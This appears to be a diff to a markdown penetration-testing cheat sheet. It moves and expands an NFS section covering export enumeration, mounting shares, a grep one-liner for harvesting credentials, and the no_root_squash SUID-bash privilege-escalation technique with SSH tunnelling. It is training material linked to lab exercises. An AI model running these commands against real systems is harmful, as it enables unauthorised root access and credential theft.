@@ -132,6 +132,8 @@ I try as much as possible to link to the various sources or inspiration for thes
   - [HTML applications](#html-applications)
   - [Microsoft Office](#microsoft-office)
   - [Windows Library Files](#windows-library-files)
+- [Server-side Attacks](#server-side-attacks)
+  - [NFS](#nfs)
 - [Thick client vulnerabilities](#thick-client-vulnerabilities)
   - [DLL Hijacking](#dll-hijacking)
   - [Insecure application design](#insecure-application-design)
@@ -176,7 +178,6 @@ I try as much as possible to link to the various sources or inspiration for thes
     - [Cron Jobs](#cron-jobs)
     - [SUID / SGID Executables](#suid--sgid-executables)
     - [Passwords & Keys](#passwords--keys)
-    - [NFS](#nfs)
     - [Kernel Exploits](#kernel-exploits)
     - [find with exec](#find-with-exec)
     - [find PE](#find-pe)
@@ -3650,6 +3651,45 @@ Library files consist of three major parts written in XML to specify the paramet
 - `sudo swaks -t <recipient> -t <recipient> --from <sender> --attach @<Windows-Library-file> --server <IP> --body @body.txt --header "Subject: Staging Script" --suppress-data -ap`
 - use WebDAV
 
+## Server-Side attacks
+
+#### <ins>NFS</ins>
+
+- > "Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user."
+- Ports: 2049, 111
+- Show the NFS server’s export list: `showmount -e <target>`
+  - The same with nmap: `nmap –sV –script=nfs-showmount <target>`
+- Mount an NFS share: `mount -o rw,vers=2 <target>:<share> <local_directory>`
+  - `mount -t nfs [-o vers=2] 192.168.182.216:/srv/share /tmp/mount -o nolock`
+  - `sudo mount -t nfs 192.168.182.216:/share /tmp/mount`
+  - `mount -o rw,vers=2 192.168.182.216:/srv/share /tmp/mount`
+  - If the mount is restricted to localhost, try with an ssh tunnel or similar
+- See [Task 19 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc)
+- One liner to extract credentials
+  - `grep -rnlE 'username|password|admin' /path/to/directory | grep -Ev '\.css$|\.html$|\.js$' | xargs -I {} grep -nHE --color=always 'username|password|admin' {} | sed -E 's/(username|password|admin)/\x1b[31m\1\x1b[0m/g'`
+
+**Root Squashing**
+- Root Squashing is how NFS prevents an obvious privilege escalation
+- `no_root_squash` turns root squashing off
+- example: `/srv/share  localhost(rw,sync,no_root_squash)`
+  ```
+  showmount -e 192.168.182.216
+  sudo mount -t nfs 192.168.182.216:/share /tmp/mount
+  sudo mount -t nfs 192.168.182.216:/srv/share /tmp/mount -o nolock
+  mount -o rw,vers=2 192.168.182.216:/srv/share /tmp/mount
+  ```
+  1. VICTIM: `cp /bin/bash .`
+  2. KALI: `sudo chown root:root bash; sudo chmod +xs bash`
+  3. VICTIM: `./bash -p`
+- if you can't mount because restricted to localhost only and you have access to the victim's machine, try ssh tunneling:
+  ```
+  ssh -N -L localhost:2049:localhost:2049 kali@192.168.45.195
+  ssh -N -L 127.0.0.1:8443:127.0.0.1:8443 kali@192.168.45.245
+  ```
+  - modify `/etc/hosts` with `echo "192.168.45.195 localhost" >> /etc/hosts`
+- Check: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
+
+
 ## Thick client vulnerabilities
 
 ### <ins>DLL Hijacking</ins>
@@ -4750,35 +4790,6 @@ Run:
     - `ls -la /tmp`
     - `ls -la /var/backups`
   - See [Task 18 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc)
-
-#### <ins>NFS</ins>
-
-- > "Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user."
-- Show the NFS server’s export list: `showmount -e <target>`
-  - The same with nmap: `nmap –sV –script=nfs-showmount <target>`
-- Mount an NFS share: `mount -o rw,vers=2 <target>:<share> <local_directory>`
-- See [Task 19 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc)
-
-**Root Squashing**
-- Root Squashing is how NFS prevents an obvious privilege escalation
-- `no_root_squash` turns root squashing off
-- example: `/srv/share  localhost(rw,sync,no_root_squash)`
-  ```
-  showmount -e 192.168.182.216
-  sudo mount -t nfs 192.168.182.216:/share /tmp/mount
-  sudo mount -t nfs 192.168.182.216:/srv/share /tmp/mount -o nolock
-  mount -o rw,vers=2 192.168.182.216:/srv/share /tmp/mount
-  ```
-  1. VICTIM: `cp /bin/bash .`
-  2. KALI: `sudo chown root:root bash; sudo chmod +xs bash`
-  3. VICTIM: `./bash -p`
-- if you can't mount because restricted to localhost only and you have access to the victim's machine, try ssh tunneling:
-  ```
-  ssh -N -L localhost:2049:localhost:2049 kali@192.168.45.195
-  ssh -N -L 127.0.0.1:8443:127.0.0.1:8443 kali@192.168.45.245
-  ```
-  - modify `/etc/hosts` with `echo "192.168.45.195 localhost" >> /etc/hosts`
-- Check: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
 
 #### <ins>Kernel Exploits</ins>
 - Enumerate the kernel version `uname -a`
